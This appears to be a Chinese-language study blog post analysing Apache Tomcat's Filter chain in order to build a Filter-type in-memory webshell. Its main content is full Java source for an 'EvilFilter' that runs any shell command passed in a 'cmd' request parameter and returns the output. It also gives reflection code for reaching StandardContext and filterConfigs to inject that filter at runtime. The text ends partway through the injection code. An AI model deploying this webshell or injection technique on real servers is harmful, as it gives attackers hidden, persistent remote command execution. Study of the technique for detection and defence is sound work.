之前我们讲，我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell

所以我们后文的目标：**动态注册恶意 Filter，并且将其放到 最前面**

# Tomcat Filter流程分析

## 项目搭建
Tomcat 8.5.81

自定义Filter
```java
import javax.servlet.*;  
import java.io.IOException;  
  
public class filter implements Filter{  
    @Override  
 public void init(FilterConfig filterConfig) throws ServletException {  
        System.out.println("Filter 初始构造完成");  
 }  
    @Override  
 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
        System.out.println("执行了过滤操作");  
 filterChain.doFilter(servletRequest,servletResponse);  
 }  
    @Override  
 public void destroy() {  
    }  
}
```
然后修改web.xml注册、激活路由
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"  
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"  
         version="4.0">  
         
    <filter>        
	    <filter-name>filter</filter-name>起名字叫filter 
        <filter-class>filter</filter-class>实现过滤功能的类  
    </filter>
    
    <filter-mapping>
        <filter-name>filter</filter-name>  使用的过滤器，对应刚刚起的名字
        <url-pattern>/filter</url-pattern> 拦截规则是访问/filter才会拦截 
    </filter-mapping>
    
</web-app>
```
启动之后可以看到，我们当前首次访问的时候初始化了Filter 每次访问都会执行过滤操作
![](picture/Pasted%20image%2020260105170610.png)

# 访问 /filter时的源码分析
根据我们前面知道，进入Filter中的时候，会调用 `Filter.doFilter()`内部的 `filterChain.doFilter()`来执行过滤操作，那我们就打断点进去看看
ok，我们首次访问之后初始化，初始化完毕之后进入 `filterChain.doFilter()`
![](picture/Pasted%20image%2020260105172128.png)
这里会进到 `ApplicationFilterChain` 类的 doFilter() 方法，它主要是进行了 `Globals.IS_SECURITY_ENABLED`，也就是全局安全服务是否开启的判断。
![](picture/Pasted%20image%2020260105172327.png)
步过这个`if`
到达了 `internalDoFilter()`
![](picture/Pasted%20image%2020260105172556.png)
通过观察我们也可以发现，其实整个过滤的过程都是在传递request和response对象，让他们走一遍过滤器链。
![](picture/Pasted%20image%2020260105172817.png)
ok我们回到正题，接着进入 `internalDoFilter()`
我们可以发现，源代码也写着 `// Call the next filter if there is one`
这里就是我们之前说到的FilterChain的地方，通过循环，把每一个Filter都过一遍
![](picture/Pasted%20image%2020260105173543.png)
可以看到 `ApplicationFilterConfig filterConfig = filters[pos++];`这行有一个filters数组，
这里数组中有两个对象，\[0\]是我们自己写的名字叫filter 走的逻辑是filter类，
还有一个\[1\]是Tomcat的过滤器，名字叫Tomcat WebSocket Filter ，走的是 `org.apache.tomcat.websocket.server.WsFilter`类的逻辑
![](picture/Pasted%20image%2020260105173703.png)

可以看到，最终执行了 `filter.doFilter()`执行了我们过滤器的主逻辑
![](picture/Pasted%20image%2020260105174954.png)
![](picture/Pasted%20image%2020260105175048.png)
然后再次循环，可以看到pos变为1了

![](picture/Pasted%20image%2020260105175124.png)
循环完毕，可以看到一些释放的操作
![](picture/Pasted%20image%2020260105180108.png)
最终去调用servlet.service()把request 和response传递下去

这里就呼应了我们之前讲Tomcat的时候说的，由最开始的`Filter.doFilter()`调用 `filterChain.doFilter()`然后由最后的 `filterChain`去调用 `Servlet。service()`

# 访问 /filter之前的源码分析

回到主线，我们的思路是要在filter的最前面加上我们的东西，让他执行恶意命令对吧。
那我们就要找找filter是怎么生成的，然后让他能调用到我们的东西就完美了。

这里看到Drun1baby师傅是通过idea的堆栈图来逆向分析的，给我了一些启发。
在这个堆栈图
![](picture/Pasted%20image%2020260105184508.png)
我们之前学习的时候知道，jvm运行当中内存会被划分为堆和栈，堆中存放对象，栈里存放执行中的方法，也就是这里的这个图，这里存放了所有过程中执行过的方法。

看我们这里是从分配线程开始的，通过粗略观察，我们可以发猜测出发生的一些动作。

![](picture/Pasted%20image%2020260105185221.png)
配合我们之前这个图就更加清晰了。
```
Server (整个 Tomcat 服务器)
└── Service (服务：将 Connector 和 Engine 组合在一起)
    ├── Connector (连接器：监听端口，负责 HTTP 协议解析，外交官)
    └── Engine (引擎：管理虚拟主机，Servlet 引擎核心)
        └── Host (虚拟主机：例如 localhost，对应域名)
            └── Context (Web 应用：对应你的项目)
	           ├── Listeners (监听器列表：最先触发) ⭐
	           ├── Filters (过滤器链：请求必经之路) ⭐
	           └── Wrappers (包装器：里面住着具体的 Servlet)⭐
```
![](picture/Pasted%20image%2020260105191649.png)
所以，我们简单看一遍就会发现我们想找的地方
从这里最后一个invoke 开始，就开始进行doFilter的过程了
![](picture/Pasted%20image%2020260105185911.png)

ok开始分析
在这个invoke方法里，我们看到了 `// Create the filter chain for this request`
![](picture/Pasted%20image%2020260105190927.png)
并且在下面调用了 `filterChain.doFilter()`走到了我们上一个标题分析过的 `doFilter`

那我们就看看 `ApplicationFilterChain filterChain =  ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);`
到底是怎么创建 `FilterChain`的

配合着注释，我们可以大概了解过程，做了一系列安全判断，最终new了一个 `ApplicationFilterChain()`然后从上下文中拿到 `filterMaps[]`
这个 `filterMaps`就装着对路由的映射，告诉Tomcat 访问什么路由的时候，会执行什么Filter
![](picture/Pasted%20image%2020260105192250.png)
遍历`StandardContext.filterMaps`得到filter与URL的映射关系并通过`matchDispatcher()`、`matchFilterURL()`方法进行匹配，匹配成功后，还需判断`StandardContext.filterConfigs`中，是否存在对应filter的实例，当实例不为空时通过`addFilter`方法，将管理filter实例的`filterConfig`添加入`filterChain`对象中。
![](picture/Pasted%20image%2020260105192710.png)
最后 return回去，走到刚刚看的doFilter，真正的执行Filter。

# Filter内存马攻击思路
内存马的思路就是
如果我也写一段代码，调用 Context 里的某个 `put` 方法（虽然它是私有的，但我们可以用反射），把我的马塞进 `filterConfigs` 这个 Map。那么，Tomcat 在下次执行 `findFilterConfig` 时，就会“无意识”地把我的马取出来执行。
本质也就是如何修改我的 `filterMaps`，也就是如何修改 web.xml 中的 filter-mapping 标签。
只要让`filterMaps`映射到我的恶意 `Filter`就能执行恶意代码了。

filterMaps 可以通过如下两个方法添加数据，对应的类是 `StandardContext` 这个类
```java
@Override
public void addFilterMap(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.add(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}

@Override
public void addFilterMapBefore(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.addBefore(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}
```

`StandardContext` 这个类是一个容器类，它负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系。

里面有三个和Filter有关的成员变量：
```java
filterMaps变量：包含所有过滤器的URL映射关系 

filterDefs变量：包含所有过滤器包括实例内部等变量 

filterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理
```
filterConfigs 成员变量是一个HashMap对象，里面存储了filter名称与对应的`ApplicationFilterConfig`对象的键值对，在`ApplicationFilterConfig`对象中则存储了Filter实例以及该实例在web.xml中的注册信息。

filterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应`FilterDef`的对象的键值对，而`FilterDef`对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据

filterMaps 中的`FilterMap`则记录了不同filter与`UrlPattern`**的映射关系**
代码理解
```java
private HashMap<String, ApplicationFilterConfig> filterConfigs = new HashMap(); 

private HashMap<String, FilterDef> filterDefs = new HashMap(); 

private final StandardContext.ContextFilterMaps filterMaps = new StandardContext.ContextFilterMaps();
```

讲完了一些基础的概念，我们来看一看 ApplicationFilterConfig 里面存了什么东西
它有三个重要的东西：  
一个是Context，一个是filter，一个是filterDef
![](picture/Pasted%20image%2020260105194557.png)
![](picture/Pasted%20image%2020260105194708.png)
现在我们好奇的就是，他是怎么把我们的映射关系存进他的上下文，然后放进 `FilterMap`的

那好，我们现在去 `org.apache.catalina.core.StandardContext`标准上下文这个类中看看我们的映射关系是怎么放进上下文的？
在这个类中，可以看到两个有趣的方法
一个是 `filterStart()`这里的 `filterConfigs.put(name, filterConfig);`把配置放进hashmap了
![](picture/Pasted%20image%2020260105195252.png)

还有就是他有这个方法，可以把映射关系添加到 `filterMap`中
![](picture/Pasted%20image%2020260105195422.png)
## 构造
所以我们的构造思路如下：
1. 获取当前的标准上下文对象
2. 通过标准上下文对象获取 `filterConfigs`
3. 接着put进去我们自己的 `filter`对象
4. 然后为我们自己的 `filter`创建一个 `FilterDef`
5. 最后把ServletContext对象、filter对象、FilterDef全部都设置到filterConfigs即可完成内存马的实现


#  Filter 型内存马的实现
首先我们先写一个我们自己的恶意 `filter` ，模仿标准的filterchain，结合之前的回显传统木马。
```java
import javax.servlet.*;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
  
import java.io.IOException;  
import java.io.InputStream;  
import java.util.Scanner;  
  
  
public class EvilFilter implements Filter {  
    public void destroy() {  
    }  
  
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {  
        HttpServletRequest req = (HttpServletRequest) request;  
        HttpServletResponse resp = (HttpServletResponse) response;  
        if (req.getParameter("cmd") != null) {  
            boolean isLinux = true;  
            String osTyp = System.getProperty("os.name");  
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {  
                isLinux = false;  
            }  
            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};  
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  
            Scanner s = new Scanner(in).useDelimiter("\\A");  
            String output = s.hasNext() ? s.next() : "";  
            resp.getWriter().write(output);  
            resp.getWriter().flush();  
        }  
        chain.doFilter(request, response);  
    }  
  
    public void init(FilterConfig config) throws ServletException {  
  
    }  
  
}
```
ok没问题
![](picture/Pasted%20image%2020260105202507.png)
那我们就要想办法把他塞进上下文了
前面说，Filter 的注入涉及到 **`filterDefs`**（定义）、**`filterMaps`**（路由映射）以及 **`filterConfigs`**（运行实例缓存）这三个关键变量。将恶意 Filter 的信息和实例分别填充进这三个容器，即可完成内存马的打入。因此，如何绕过沙箱或封装直接获取到当前 Web 应用的 `StandardContext` 实例，成了实现攻击的核心前提。

>于是初步思路是这样拿到上下文对象的：
>```java
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  //从线程中拿到当前线程ContextClassLoader
>
StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();//拿到WebResourceRoot接口的实例，强转为StandarRoot，其中有指向StandardContext的引用。
>
>StandardContext standardContext = (StandardContext) standardroot.getContext();
>```

标准思路是这样的
![](picture/Pasted%20image%2020260105212912.png)
先是通过反射获取到 standContext
```java
ServletContext servletContext = request.getSession().getServletContext();//先通过session拿到ServletContext ，本质是ApplicationContextFacade的马甲类 
  
  //通过反射访问私有属性context，拿到了ApplicationContext
 Field appctx = servletContext.getClass().getDeclaredField("context"); 
 appctx.setAccessible(true);  
 ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
  
  //再次反射拿StandardContext
 Field stdctx = applicationContext.getClass().getDeclaredField("context");  
 stdctx.setAccessible(true);  
 StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
  
  
  //拿到filterConfigs这个Map
 String FilterName = "cmd_Filter";  
 Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
 Configs.setAccessible(true);  
 filterConfigs = (Map) Configs.get(standardContext); 
 
 //后面把恶意的Filter put到map中
```




















